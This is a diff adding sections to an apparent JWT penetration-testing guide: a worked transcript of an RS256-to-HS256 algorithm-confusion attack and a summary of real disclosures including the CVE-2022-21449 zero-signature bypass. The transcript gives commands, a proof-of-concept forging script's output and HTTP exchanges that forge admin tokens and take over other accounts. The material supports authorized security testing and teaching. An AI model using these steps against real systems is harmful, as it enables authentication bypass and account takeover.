@@ -409,6 +409,72 @@ python3 jwt_tool.py <TOKEN> -X k -pk public.pem
 - A working RS→HS confusion = **mint any token** = Critical (auth bypass / ATO / admin).
 - **Key-formatting is the usual snag**: the secret must be the *exact* bytes the server uses (PEM text vs DER, with/without trailing `\n`, X.509 SubjectPublicKeyInfo vs PKCS#1). `poc/rs256_to_hs256.py` brute-forces these variants for you.
 
+## 8.4 The full attack, end-to-end — RS256→HS256 confusion → forge admin → ATO (worked transcript) ⭐
+
+> *This is the flagship worked example* — the signature-defining JWT money attack (Appendix B marks it "⭐ try first"), on the wire. Two own accounts, benign markers, offline forging only; nothing brute-forced against the server.
+
+**Target.** `api.target.com` issues an RS256 session JWT. I hold one low-priv account (`alice`, `sub:1001`, `role:user`). Goal: become an admin without admin creds.
+
+**Step 1 — decode and fingerprint (§4).** Grab my own token and read the header:
+```bash
+$ echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null
+{"alg":"RS256","typ":"JWT","kid":"prod-2024"}
+$ echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
+{"sub":1001,"role":"user","iss":"api.target.com","exp":1793000000}
+```
+`alg:RS256` (asymmetric, verify-with-public-key) — so the server holds a private key I don't have. The confusion attack asks: *does it let the token pick HS256, and does it then use the public key as the HMAC secret?*
+
+**Step 2 — get the public key (§4.3).** RS256 verifiers publish it; convert the JWK `(n,e)` to a PEM:
+```bash
+$ curl -s https://api.target.com/.well-known/jwks.json | tee jwks.json
+{"keys":[{"kty":"RSA","kid":"prod-2024","n":"0vx7...KHQ","e":"AQAB","alg":"RS256"}]}
+$ python3 -c 'import json,sys;from jwcrypto import jwk;\
+k=jwk.JWK(**json.load(open("jwks.json"))["keys"][0]);sys.stdout.buffer.write(k.export_to_pem())' > public.pem
+$ head -1 public.pem
+-----BEGIN PUBLIC KEY-----
+```
+(If there were no JWKS, §9 recovers `(n,e)` from two captured tokens — "RS256 with no published key" is *not* safe.)
+
+**Step 3 — baseline the confusion (prove acceptance before I escalate, §5).** First forge a token that changes **nothing but the algorithm** — same claims (no `--claim` overrides) — so a success isolates the crypto bug from any claim effect. The PoC emits one candidate **per key-byte representation** because the exact bytes the server uses is the usual snag:
+```bash
+$ python3 poc/rs256_to_hs256.py "$TOKEN" --pubkey public.pem
+[+] pem_file_asis      -> eyJhbGciOiJIUzI1Ni...   # PEM exactly as written to disk
+[+] pem_file_stripped  -> eyJhbGciOiJIUzI1Ni...   # trailing \n removed
+[+] spki_der           -> eyJhbGciOiJIUzI1Ni...   # DER SubjectPublicKeyInfo
+[+] pkcs1_pem          -> eyJhbGciOiJIUzI1Ni...   # PKCS#1 form
+```
+Send the candidates in turn to an endpoint that authorizes on the token and echoes identity; `pem_file_asis` lands:
+```http
+GET /api/me HTTP/1.1
+Host: api.target.com
+Authorization: Bearer eyJhbGciOiJIUzI1Ni...(sub:1001,role:user, HS256-signed with the public key)
+```
+```
+HTTP/1.1 200 OK
+{"id":1001,"role":"user","email":"alice@example.com"}
+```
+**200, not 401.** The server accepted an **HS256** token signed with its own **public** key — the confusion is live, and the winning representation is the raw PEM file bytes. This baseline used my real claims, so the only thing I proved is the crypto — clean.
+
+**Step 4 — escalate: forge the admin token (§25).** Re-run with a tampered claim, reusing the winning representation:
+```bash
+$ python3 poc/rs256_to_hs256.py "$TOKEN" --pubkey public.pem --claim role=admin
+[+] pem_file_asis      -> eyJhbGciOiJIUzI1Ni...(role:admin)
+```
+```http
+GET /api/admin/users HTTP/1.1
+Host: api.target.com
+Authorization: Bearer eyJhbGciOiJIUzI1Ni...(role:admin)
+```
+```
+HTTP/1.1 200 OK
+{"users":[{"id":1001,"role":"user"},{"id":1,"role":"admin"},...]}   # admin-only listing
+```
+**Behavior changed** (§29.5): a `user`-role account is reading the admin user list. That is the finding — not "the token was accepted," but *an admin action succeeded on a forged token.*
+
+**Step 5 — prove ATO, then STOP (§23/§32).** Swap identity with `--claim sub=1` and forge again → `/api/me` returns account `1`'s identity = full account takeover of any user. One benign proof (read my own-vs-another identity), redact the key/token in the report, and stop. **I never brute-forced anything against the server** — the public key was public, the forging was offline, and the only requests sent were a handful of signed candidates.
+
+**Why this is the JWT-defining bug.** The public key being *public* is the whole point of RS256 — it's safe **until the verifier lets the token choose HS256** and reuses that public key as a symmetric secret. One header edit (`RS256`→`HS256`) turns a verify-only key into a stamp-and-verify key. This exact class is Tim McLean's 2015 disclosure (§35), still found in production a decade later.
+
 ---
 
 # 9. Recovering the RSA Public Key When It's Not Published
@@ -1020,6 +1086,14 @@ The verifier fetched `jku` but required the host to match the issuer domain. An 
 A token with `role:admin` was accepted, but the app re-derived privileges from the DB, so nothing changed. Recognized as a **non-finding** (§29.5) and dropped rather than reported as "privilege escalation." Lesson: acceptance ≠ impact; verify behavior change before claiming priv-esc.
 
 > **Common thread:** in every real payout the win was a **forged token the server *acted on*** — admin, another user, mass reset. The crypto was the door; the report was the impact behind it.
+
+## 35.1 Verified real-world CVEs & disclosures
+
+> Re-verified against primary sources (linked in Appendix references) — the named, dated events behind the techniques above.
+
+- **Tim McLean — "Critical vulnerabilities in JSON Web Token libraries" (Auth0 blog, 2015) — the class-defining disclosure.** McLean audited the major implementations (**node-jsonwebtoken, pyjwt, jjwt, php-jwt, namshi/jose, jsjwt**) and reported **two** flaws that still pay bounties a decade later: (1) libraries accepting `{"alg":"none"}` with an empty signature as *cryptographically valid* (§6), and (2) **RS256→HS256 algorithm confusion** — a verifier that takes the *algorithm from the token* would HMAC-verify with the **RSA public key as the shared secret**, so anyone holding the public key can forge (§8, the §8.4 transcript). The root cause is a verifier that trusts the token's own `alg` header. The industry fix — reject any algorithm the application didn't expect — is now codified in **RFC 8725 (JWT Best Current Practices)**. Lesson: this isn't a historical curiosity; it's the first thing to test on any RS256 deployment.
+
+- **CVE-2022-21449 "Psychic Signatures" (Neil Madden, April 2022) — the crypto did the forging for you.** Java 15–18 (and GraalVM) shipped an ECDSA verifier that **failed to check that the signature values `r` and `s` are non-zero**. Because the verification equation multiplies by those values, a signature of **`(r=0, s=0)`** zeroes both sides → `0 == 0` is *true* → **any ES256/ES384/ES512 signature is accepted.** For a JWT tester: if the target runs a vulnerable Java version and verifies **ES256** tokens, you tamper the payload and replace the signature with the all-zero value → complete signature-verification bypass → auth bypass as any user. It's the ECDSA analogue of `alg:none`, and the reason the `ES*` psychic-signature check is in §14. Patched in the April 2022 Oracle CPU. Lesson: the algorithm family and the *runtime version* matter — an "asymmetric, properly-signed" token can still be forgeable because of a JVM bug, not an app bug.
 
 ---
 
